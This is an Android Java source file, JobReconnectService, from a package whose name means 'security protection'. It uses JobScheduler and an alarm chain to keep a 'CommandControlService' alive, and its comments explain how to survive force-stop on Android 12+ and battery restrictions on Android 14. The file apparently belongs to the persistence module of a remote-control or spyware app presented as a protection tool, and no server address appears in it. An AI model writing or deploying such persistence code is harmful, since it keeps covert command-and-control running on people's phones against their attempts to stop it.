package com.seguranca.protecao;

import android.app.job.JobParameters;
import android.app.job.JobService;
import android.util.Log;

/**
 * JobReconnectService — Android JobService invoked by PersistenceEngine via JobScheduler.
 *
 * JobScheduler survives app process death (the job is stored in the OS scheduler).
 * On Android 12+, force-stop also cancels pending jobs UNLESS they are expedited
 * and setPersisted(true) is set. On Android 14+, expedited jobs have the best
 * chance of firing despite battery restrictions.
 *
 * Fires when:
 *   - Network becomes available (setRequiredNetworkType(ANY))
 *   - Immediately after scheduling (setMinimumLatency(0) + setOverrideDeadline(500))
 *   - Every 15 minutes as periodic watchdog
 */
public class JobReconnectService extends JobService {

    private static final String TAG = "JRS";

    @Override
    public boolean onStartJob(JobParameters params) {
        Log.d(TAG, "JobReconnectService fired (jobId=" + params.getJobId() + ")");

        // Ensure CommandControlService is running
        PersistenceEngine.ensureServiceRunning(getApplicationContext());

        // Rearm the alarm chain while we're awake
        try {
            PersistenceEngine.armAlarmChain(getApplicationContext());
        } catch (Exception e) {
            Log.e(TAG, "rearm alarm: " + e.getMessage());
        }

        // Work is done — no async work needed
        jobFinished(params, /* needsReschedule= */ false);
        return false; // false = work done on this thread
    }

    @Override
    public boolean onStopJob(JobParameters params) {
        // Return true to reschedule if the job is interrupted
        return true;
    }
}
